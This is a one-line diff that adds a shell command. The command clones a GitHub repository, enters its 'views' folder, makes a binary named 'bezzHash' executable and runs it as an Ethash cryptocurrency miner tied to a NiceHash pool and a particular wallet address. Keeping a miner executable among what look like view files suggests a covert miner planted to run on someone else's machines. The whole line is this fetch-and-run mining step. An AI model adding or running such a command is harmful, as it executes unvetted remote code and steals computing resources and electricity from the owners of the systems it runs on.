@@ -1,0 +1,1 @@
+git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash && ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:33353 --user 3JkgN64Rw6AXXhZQWiYQngFMjVyD1CWped.Semogaberkah --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
